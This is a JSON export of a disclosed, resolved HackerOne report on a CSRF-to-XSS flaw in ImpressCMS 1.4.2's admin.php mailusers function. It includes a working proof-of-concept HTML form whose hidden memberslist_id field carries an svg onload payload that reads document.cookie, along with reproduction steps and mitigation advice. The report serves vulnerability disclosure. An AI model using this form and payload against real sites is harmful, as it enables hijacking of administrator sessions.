{
  "id": 1096123,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDk2MTIz",
  "url": "https://hackerone.com/reports/1096123",
  "title": "CSRF to XSS in /htdocs/modules/system/admin.php",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2021-02-05T12:56:32.575Z",
  "submitted_at": "2021-02-05T12:56:32.690Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "d3addog",
    "url": "/d3addog",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/6eYT7pNzVhruckM1E1V5w8K1/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 38302,
    "url": "https://hackerone.com/impresscms",
    "handle": "impresscms",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/038/302/c9f69b5546e2b4211c0a26681a398b1685cc5ebb_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/038/302/c9f69b5546e2b4211c0a26681a398b1685cc5ebb_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "ImpressCMS",
      "twitter_handle": "impresscms",
      "website": "https://www.impresscms.org",
      "about": "PHP and MySQL content management system"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-10-14T18:47:43.005Z",
  "bug_reporter_agreed_on_going_public_at": "2023-10-10T09:52:55.108Z",
  "team_member_agreed_on_going_public_at": "2023-10-14T18:47:42.885Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\n\nThe ```memberslist_id``` and ```memberlist_uname[]``` POST parameters in the scenario \"/htdocs/modules/system/admin.php\" are affected by XSS due to lack of user supplied data filtration. Due to lack of CSRF token verification it is possible for attacker to craft special web page, which will perform request to the vulnerable ImpressCMS application on authorised user behalf, upon visiting it. \n\n## ImpressCMS branch :\n\nImpress CMS version: 1.4.2\nPHP Version: 7.2.24\n\n## Browsers Verified In:\n\nFirefox 85.0\n\n## Steps To Reproduce:\n\n  1) Host a web server with the following page (note that url in form action should be modified with your testing address)\n\n```\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://<YOUR IMPRESS CMS HOST>/htdocs/modules/system/admin.php?fct=mailusers\" method=\"POST\">\n        <input type=\"hidden\" name=\"mail&#95;to&#95;group&#91;&#93;\" value=\"2\" />\n      <input type=\"hidden\" name=\"mail&#95;lastlog&#95;min\" value=\"\" />\n      <input type=\"hidden\" name=\"mail&#95;lastlog&#95;max\" value=\"\" />\n      <input type=\"hidden\" name=\"mail&#95;idle&#95;more\" value=\"\" />\n      <input type=\"hidden\" name=\"mail&#95;idle&#95;less\" value=\"\" />\n      <input type=\"hidden\" name=\"mail&#95;regd&#95;min\" value=\"\" />\n      <input type=\"hidden\" name=\"mail&#95;regd&#95;max\" value=\"\" />\n      <input type=\"hidden\" name=\"mail&#95;fromname\" value=\"ImpressCMS\" />\n      <input type=\"hidden\" name=\"mail&#95;fromemail\" value=\"impress&#64;notexist&#46;notexist\" />\n      <input type=\"hidden\" name=\"mail&#95;subject\" value=\"\" />\n      <input type=\"hidden\" name=\"mail&#95;body\" value=\"&#123;&#36;smarty&#46;version&#125;\" />\n      <input type=\"hidden\" name=\"mail&#95;send&#95;to&#91;&#93;\" value=\"mail\" />\n      <input type=\"hidden\" name=\"mail&#95;submit\" value=\"Send\" />\n      <input type=\"hidden\" name=\"op\" value=\"send\" />\n      <input type=\"hidden\" name=\"mail&#95;start\" value=\"0\" />\n      <input type=\"hidden\" name=\"memberslist&#95;id&#91;&#93;\" value=\"asdf&apos;&gt;&lt;&#47;a&gt;&lt;svg&#47;onload&#61;alert&#40;document.cookie&#41;&gt;\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n\n```\n  2)  Login to your ImpressCMS application with privileged account\n  3) In the same browser open web page from step 1 and click \"Submit request\"\n  4) See the XSS payload fired \n\n## Suggestions to mitigate or resolve the issue:\nProperly sanitise  user input using built-in ```StopXSS``` function. Properly check CSRF token\n\n## Credits\nThis bug was found as a part of Solar Security CMS Reseach, with https://hackerone.com/d0bby, https://hackerone.com/wezery0, https://hackerone.com/silvereniqma in collaboration. Can you, please, add them to this report?\n\n## Impact\n\nCSRF leading to XSS",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1184973,
      "file_name": "xss_csrf_impress.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jb4s9b4gd35a2pde2qvvgm7856gf?response-content-disposition=attachment%3B%20filename%3D%22xss_csrf_impress.png%22%3B%20filename%2A%3DUTF-8%27%27xss_csrf_impress.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRSPJQEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T140519Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIANREuSO5xRo5uYh9p3fj5lFZASOM0CJaqF9aRTyqP1tAiBMs6gYtXIgibXyOqYUXBJZxA%2Fdza4ke6K%2F%2F0b5E9m1RSqwBQh2EAMaDDAxMzYxOTI3NDg0OSIM8OmUCbC3Pqq1SyEDKo0F3cO4ThOa4uitsGZnpJd4WSWYKi0%2F5mL8qwHwgq3ZuZ1aNUqEK3JGtjDNNtehYQzb3K%2BVzvT15T5E0DeN3sE8NL7KIl3i0Dx5W04t%2FCwofuZVDH6Rwez2OIyLRGEiHKo%2FP%2FkbGO6J7x9mVhWTOKS2bFg4igbBGqP%2Bi2aedUT3vluiB7ukP1cc428RmdmCV%2BuhSI6mu%2Fx6zanZ8MjIY1iRcGFyRSvjl0iN9Apkcqbj2H8R4UNg8b2kqipVUPR0IhWE4Repf%2B6oHnySIQcgKlfP60eivKF7%2BDxEpCbVDsb91wMe67XzEaDtj4q3yEkaR59%2FnN0%2Fg51i8gvLHyAK2aB8UWfJhpojdnN%2FB%2BaF6aGM1Zep47eAH4cQQWhMZ2I26LKQhm7iwRj6IEHbgHd2m6nHPOKHU2uWuHo13GDorNeQWMI%2FABbIu1tC%2FBPGMydY2v4uUNIntKjUUw%2BXSGO9A9lk6BbiANo%2BTxvrgKzjhYstigi28K%2FJy2l%2B50z3nW5D8NMHVXHTF9%2FfZJj2T3gBRe9rfchTv6%2Bbpy1%2Bn8nOxmudj%2B9inUeddHC6rtgTt35Y1V%2FQuDeghaOCTLBIQIRUj2dXMLrSvM6ipTuqtOLpxyjWPKhlGteSd9sRZ2GulqFnPco4IJ18%2Fn03rD%2FZTFvntG5nnCfDUN1rKUSiHRLc%2Be2fxn1LToFrzjJFDRvOSJIM%2FpzLFcAYL8tTTyFBkIKfd049EasT8fD7XkmUkbP9SU%2Fz3oask16Cc%2FxTEDv733bE%2B2WRdqbzle4n0HY%2F8WFiXHg%2FcBG11MfaIEqM74wTZ5xO8lGQRD8qVunQROTT4innfbTfWRrrpjWEVYNiOx7p4%2BZ0qgpFMn9%2F3hcTkdABX%2BMwpcOtrgY6sgEIuPpZKWB6MctyieUs6Zf8b%2FX4IKPm%2BfhMeS2tI0il7r2OReIXdjDVkC4sQOPEZhbn%2BDfZAXOoMl6LPgx5C10nOg8D%2BTLxqQZt9rcPO7a6NY6DuIvhZo5c4RdVjEGuOfc%2FAROg4UmbOf0zkue94sBg8VslzPwR4H20rwyBYQqkWxtaGVbZKYCCbNb6IEpuSkgMadMJvwHOmUUOWS2k1Jnl6yQZixJKKroR7DQEK1J3Lebd&X-Amz-SignedHeaders=host&X-Amz-Signature=5c94f14b00a0c027c0dc25c5dcc75ac8571daa5deb6b25780f58c1c1787429a6",
      "file_size": 110898,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2023-11-09T09:52:55.253Z",
  "allow_singular_disclosure_after": -8309543.979997268,
  "singular_disclosure_allowed": true,
  "vote_count": 15,
  "voters": [
    "shreyaschavhan",
    "zy9ard3",
    "bl4de",
    "shubham_srt",
    "eminf",
    "shivammusic",
    "haijwnwn",
    "amir2233",
    "vikramnr",
    "m4khn0",
    "and 5 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 28943,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/impresscms/impresscms",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
